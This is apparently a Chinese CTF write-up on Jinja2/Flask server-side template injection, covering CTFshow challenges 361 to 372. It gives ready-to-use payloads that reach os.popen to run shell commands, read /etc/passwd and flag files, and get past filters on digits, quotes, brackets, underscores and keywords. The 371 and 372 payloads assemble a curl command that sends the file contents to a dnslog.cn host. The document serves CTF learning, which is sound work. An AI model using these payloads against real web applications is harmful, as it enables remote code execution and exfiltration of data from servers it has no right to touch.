---
title: CTFshowSSTI
abbrlink: 45647
date: 2022-04-18 16:44:45
tags: 
- CTF
- web
- SSTI
---

# SSTI

### **Python中有用的魔术方法**

```python
__class__           查看对象所在的类
__mro__             查看继承关系和调用顺序，返回元组
__base__            返回基类
__bases__           返回基类元组
__subclasses__()    返回子类列表
__init__            调用初始化函数，可以用来跳到__globals__
__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典
__builtins__        返回内建内建名称空间字典
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）		都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
{{cycler.__init__.__globals__.os.popen('ls').read()}}
current_app          应用上下文，一个全局变量
request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1   	 get传参
request.values.x1 	 所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data  		 post传参	(Content-Type:a/b)
request.json		 post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

### 代码块

```
变量块 {{}}	用于将表达式打印到模板输出
注释块 {##}	注释
控制块	{%%}	可以声明变量，也可以执行语句
行声明	##		可以有和{%%}相同的效果
```

### 常用的过滤器

```
int()：将值转换为int类型；
float()：将值转换为float类型；
lower()：将字符串转换为小写；
upper()：将字符串转换为大写；
title()：把值中的每个单词的首字母都转成大写；
capitalize()：把变量值的首字母转成大写，其余字母转小写；
trim()：截取字符串前面和后面的空白字符；
wordcount()：计算一个长字符串中单词的个数；
reverse()：字符串反转；
replace(value,old,new)： 替换将old替换为new的字符串；
truncate(value,length=255,killwords=False)：截取length长度的字符串；
striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。
safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；
list()：将变量列成列表；
string()：将变量转换成字符串；
join()：将一个序列中的参数值拼接成字符串。示例看上面payload；
abs()：返回一个数值的绝对值；
first()：返回一个序列的第一个元素；
last()：返回一个序列的最后一个元素；
format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!
length()：返回一个序列或者字典的长度；
sum()：返回列表内数值的和；
sort()：返回排序后的列表；
default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
length()返回字符串的长度，别名是count
```

### **Flask的一些全局变量 && 关键字**

```python
{{config}}
{{requests}}
{{requests.environ}}
{{self}}
{{url_for}}
{{get_flashed_messages}}
{{url_for.__globals__["os"].system('calc')}}
```

### 常用payload

```
>>>''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
>>>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
//想要获取命令执行结果可以在后面加上.read()
>>>''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()
 
--------------------------------
 
>>>object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
 
--------------------------------
{{''.__class__.__mro__[-1].__subclasses__()[200]('calc') }}
其中的xxxx可以为任意字符
{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.eval("__import__('os').popen('whoami').read()") }}
{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.exec("__import__('os').popen('calc').read()") }} #本地测试不知道为什么执行whoami只会返回None

```

[拓展](https://dar1in9s.github.io/2020/09/15/ssti进阶/)

### 16进制绕过

可使用16进制绕过关键字符

```
\x5f _
```

寻找可用类脚本

```python
import json

a = """
"""

num = 0
allList = []

result = ""
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i

for k, v in enumerate(allList):
    if "os._wrap_close" in v:
        print(str(k) + "--->" + v)
```

#### [除了python之外的SSTI](https://www.cnblogs.com/bmjoker/p/13508538.html)







**361**

无过滤，参数名为name，直接执行命令即可

```
payload:?name={{"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac /flag').read()}}
```

**362**

过滤了数字，使用全角数字代替正常数字

```
payload:?name={{"".__class__.__base__.__subclasses__()[１３２].__init__.__globals__['popen']('tac /flag').read()}}
```

**363**

过滤了单双引号，可通过request.args传入新参数解决，或者使用chr来绕过

```
//request.args
payload:?name={{config.__class__.__init__.__globals__[request.args.a][request.args.b](request.args.c).read()}}&a=os&b=popen&c=tac /flag
```

```
//chr
payload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}
```

**364**

过滤了args，无法使用GET传参了，使用~~POST（方法被禁用了）~~或者cookie都可

```
//cookie
payload:?name={{config.__class__.__init__.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}
Cookie: a=os;b=popen;c=tac /flag;
```

```
//chr
payload:?name={% set chr=url_for.__globals__.__builtins__.chr %}{{url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()}}
```

**365**

过滤了中括号，换点

```
//cookie
payload:?name={{config.__class__.__init__.__globals__.os.popen(request.cookies.a).read()}}
Cookie: a=tac /flag
```

**366**

过滤了下划线，这里用attr方法：request|attr(request.cookies.a)等价于request[“a”]

```
payload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).os.popen(request.cookies.d).read()}}
Cookie: a=__class__; b=__init__; c=__globals__; d=tac /flag;
```

他人WP

```
payload:?name={{(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()}}
Cookie: a=__globals__;b=cat /flag;
```

**367**

过滤了os，继续用attr

```
payload:?name={{(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()}}
Cookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;
```

**368**

过滤了{undefined{undefined，使用命令方式print

```
payload:?name={% print((config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()) %}
Cookie: a=__class__; b=__init__; c=__globals__; d=tac /flag; e=os;
```

**369**

过滤了request，没办法传递参量了，使用模版过滤器

```
payload:?name={% set po=dict(po=a,p=a)|join%}//构造pop，为下方提供_
{% set a=(()|select|string|list)|attr(po)(24)%}//构造出_
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}//构造出__init__
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}//构造出__globals__
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}//构造出__getitem__
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}//构造出__builtins__
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}//构造出builtins模块
{% set chr=x.chr%}//使用chr函数
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}//构造出字符串/flag
{%print(x.open(file).read())%}//读文件
```

**370**

过滤数字用全角，或者使用length，count构造数字

```
payload:?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}
{%print(x.open(file).read())%}
```

**371**

print回显被禁，dnslog外带

```
?name={%set po=(dict(po=a,p=a)|join)%}
{% set ershisi=(dict(eeeeeeeeeeeeeeeeeeeeeeee=a)|join|length)%}
{% set xiahuaxian=(()|select|string|list)|attr(po)(ershisi)%}
{% set ur=((dict(ur=a,l=a)|join,xiahuaxian,dict(fo=a,r=a)|join)|join)%}
{% set glo=((xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join)%}
{% set ous=(dict(o=a,s=a)|join)%}
{% set ouuu=(ur|attr(glo)|attr(ous))%}
```

```
?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}
```

**372**

count换成length

```
?name={%set a=dict(po=aa,p=aa)|join%}{%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%}{%set k=dict(eeeeeeeee=a)|join|length%}{%set l=dict(eeeeeeee=a)|join|length%}{%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%}{%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%}{% set b=(lipsum|string|list)|attr(a)(j)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{% set f=(lipsum|string|list)|attr(a)(k)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%}{%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%}{%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%}{%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czducq=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%}{%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%}{%endif%}
```

